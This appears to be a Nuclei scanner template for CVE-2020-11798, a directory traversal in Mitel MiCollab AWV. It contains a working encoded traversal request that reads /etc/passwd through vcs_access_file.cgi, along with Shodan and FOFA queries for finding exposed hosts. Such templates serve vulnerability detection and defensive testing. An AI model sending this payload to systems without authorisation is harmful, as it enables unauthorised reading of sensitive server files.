id: CVE-2020-11798

info:
  name: Mitel MiCollab AWV 8.1.2.4 and 9.1.3 - Directory Traversal
  author: ritikchaddha
  severity: medium
  description: |
    A Directory Traversal vulnerability in the web conference component of Mitel MiCollab AWV before 8.1.2.4 and 9.x before 9.1.3 could allow an attacker to access arbitrary files from restricted directories of the server via a crafted URL, due to insufficient access validation. A successful exploit could allow an attacker to access sensitive information from the restricted directories.
  impact: |
    An attacker can exploit this vulnerability to view, modify, or delete arbitrary files on the system, potentially leading to unauthorized access or data leakage.
  remediation: |
    Apply the latest security patches or updates provided by Mitel to mitigate the vulnerability and prevent unauthorized access.
  reference:
    - https://packetstormsecurity.com/files/171751/mma913-traversallfi.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2020-11798
    - http://packetstormsecurity.com/files/171751/Mitel-MiCollab-AWV-8.1.2.4-9.1.3-Directory-Traversal-LFI.html
    - https://www.mitel.com/-/media/mitel/file/pdf/support/security-advisories/security-bulletin-20-0005-01.pdf
    - https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-20-0005
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-11798
    cwe-id: CWE-22
    epss-score: 0.85152
    epss-percentile: 0.99313
    cpe: cpe:2.3:a:mitel:micollab_audio\,_web_\&_video_conferencing:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: mitel
    product: micollab_audio\,_web_\&_video_conferencing
    shodan-query:
      - html:"Mitel" html:"MiCollab"
      - http.html:"mitel" html:"micollab"
    fofa-query: body="mitel" html:"micollab"
  tags: cve,cve2020,packetstorm,mitel,micollab,lfi,vkev

http:
  - method: GET
    path:
      - "{{BaseURL}}/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - application/x-download
          - filename=passwd
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022041181b4438176b19004844c85f42267df0e1bfb99e269393d67193dd6526f999022100fe9c36920cbd8b5d4f4a2210b4de78b7760084b2f74544e5a645132e776b78db:922c64590222798bb761d5b6d8e72950